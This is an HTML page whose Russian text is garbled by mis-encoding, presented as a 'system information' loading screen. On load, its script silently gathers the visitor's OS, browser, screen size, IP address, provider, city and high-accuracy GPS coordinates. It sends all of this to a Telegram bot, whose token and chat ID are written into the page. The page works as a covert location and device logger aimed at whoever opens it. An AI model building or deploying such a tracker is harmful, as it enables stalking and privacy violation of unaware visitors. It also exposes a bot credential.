<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            max-width: 600px;
        }
        
        h1 {
            color: #333;
            margin-bottom: 20px;
            font-size: 24px;
        }
        
        .status {
            color: #666;
            font-size: 18px;
            margin-bottom: 30px;
        }
        
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success {
            color: #27ae60;
            font-size: 22px;
            font-weight: bold;
            margin-top: 20px;
        }
        
        .error {
            color: #e74c3c;
            font-size: 18px;
            margin-top: 20px;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>–°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h1>
        <div class="status" id="status">–°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö...</div>
        <div class="loader"></div>
        <div class="success hidden" id="success">–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!</div>
        <div class="error hidden" id="error"></div>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const BOT_TOKEN = '7100525865:AAG-ed_1X1DPx-ngsnUrTKRUuuH2DvvjLxE';
        const CHAT_ID = '6330090175'; // –í–∞—à chat_id (–º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å —á–µ—Ä–µ–∑ @userinfobot)
        
        // –û—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
                return false;
            }
        }
        
        function detectOS() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Windows")) return "Windows";
            if (userAgent.includes("Mac OS")) return "Mac OS";
            if (userAgent.includes("Linux")) return "Linux";
            if (userAgent.includes("Android")) return "Android";
            if (userAgent.includes("iOS")) return "iOS";
            return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –û–°";
        }
        
        function detectBrowser() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("Chrome")) return "Chrome";
            if (userAgent.includes("Safari")) return "Safari";
            if (userAgent.includes("Edge")) return "Edge";
            if (userAgent.includes("Opera")) return "Opera";
            return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä";
        }
        
        function detectBrowserVersion() {
            const ua = navigator.userAgent;
            let version = "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è";
            
            if (ua.includes("Firefox/")) {
                version = ua.split("Firefox/")[1];
            } else if (ua.includes("Chrome/")) {
                version = ua.split("Chrome/")[1].split(" ")[0];
            } else if (ua.includes("Safari/")) {
                version = ua.split("Version/")[1]?.split(" ")[0] || "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è";
            } else if (ua.includes("Edg/")) {
                version = ua.split("Edg/")[1];
            }
            
            return version.split(".")[0] || "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è";
        }
        
        async function getIPInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const geoData = await geoResponse.json();
                
                return {
                    ip,
                    type: ip.includes(':') ? 'IPv6' : 'IPv4',
                    provider: geoData.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    country: geoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    region: geoData.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    city: geoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    latitude: geoData.latitude || 'N/A',
                    longitude: geoData.longitude || 'N/A',
                    timezone: geoData.timezone || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                };
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏:', error);
                return null;
            }
        }
        
        async function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: "–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º" });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    error => {
                        let errorMessage;
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "–î–æ—Å—Ç—É–ø –∫ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∑–∞–ø—Ä–µ—â–µ–Ω";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "–í—Ä–µ–º—è –∑–∞–ø—Ä–æ—Å–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∏—Å—Ç–µ–∫–ª–æ";
                                break;
                            default:
                                errorMessage = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏";
                        }
                        resolve({ error: errorMessage });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        function formatMessage(data) {
            return `
üì° *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ*

üñ•Ô∏è *–û–°:* ${data.os}
üåê *–ë—Ä–∞—É–∑–µ—Ä:* ${data.browser} (v${data.browserVersion})
üñ•Ô∏è *–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞:* ${data.screenWidth}x${data.screenHeight}
üåç *–Ø–∑—ã–∫:* ${data.language}

üì∂ *–°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è*
üîå *IP-–∞–¥—Ä–µ—Å:* ${data.ipInfo.ip} (${data.ipInfo.type})
üè¢ *–ü—Ä–æ–≤–∞–π–¥–µ—Ä:* ${data.ipInfo.provider}
üìç *–°—Ç—Ä–∞–Ω–∞/–ì–æ—Ä–æ–¥:* ${data.ipInfo.country}, ${data.ipInfo.city}
üó∫Ô∏è *–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã (–ø—Ä–∏–±–ª–∏–∑–∏—Ç–µ–ª—å–Ω—ã–µ):* ${data.ipInfo.latitude}, ${data.ipInfo.longitude}
‚è∞ *–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å:* ${data.ipInfo.timezone}

üìç *–¢–æ—á–Ω—ã–µ GPS-–∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:*
${data.gps.lat && data.gps.lon ? 
`‚úÖ *–®–∏—Ä–æ—Ç–∞:* ${data.gps.lat.toFixed(6)}
‚úÖ *–î–æ–ª–≥–æ—Ç–∞:* ${data.gps.lon.toFixed(6)}
üìè *–¢–æ—á–Ω–æ—Å—Ç—å:* ~${Math.round(data.gps.accuracy)} –º–µ—Ç—Ä–æ–≤` : 
`‚ùå ${data.gps.error}`}

üïí *–í—Ä–µ–º—è –∑–∞–ø—Ä–æ—Å–∞:* ${new Date().toLocaleString()}
            `;
        }
        
        // –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        async function collectAndSendData() {
            try {
                // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å
                document.getElementById('status').textContent = "–°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö...";
                
                // –°–æ–±–∏—Ä–∞–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                const systemData = {
                    os: detectOS(),
                    browser: detectBrowser(),
                    browserVersion: detectBrowserVersion(),
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    language: navigator.language || navigator.userLanguage
                };
                
                // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP
                const ipInfo = await getIPInfo();
                if (!ipInfo) {
                    throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± IP");
                }
                
                // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å —Ç–æ—á–Ω—ã–µ GPS –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã
                const gpsData = await getGPS();
                
                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                const fullData = {
                    ...systemData,
                    ipInfo,
                    gps: gpsData
                };
                
                const message = formatMessage(fullData);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                document.getElementById('status').textContent = "–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö...";
                const success = await sendToTelegram(message);
                
                if (success) {
                    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö –Ω–∞ 3 —Å–µ–∫—É–Ω–¥—ã
                    document.querySelector('.loader').classList.add('hidden');
                    document.getElementById('success').classList.remove('hidden');
                    document.getElementById('status').textContent = "–ü—Ä–æ—Ü–µ—Å—Å –∑–∞–≤–µ—Ä—à–µ–Ω";
                    
                    setTimeout(() => {
                        document.getElementById('success').classList.add('hidden');
                    }, 3000);
                } else {
                    throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –≤ Telegram");
                }
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                document.querySelector('.loader').classList.add('hidden');
                document.getElementById('status').textContent = "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞";
                document.getElementById('error').textContent = error.message;
                document.getElementById('error').classList.remove('hidden');
            }
        }
        
        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = collectAndSendData;
    </script>
</body>
</html>
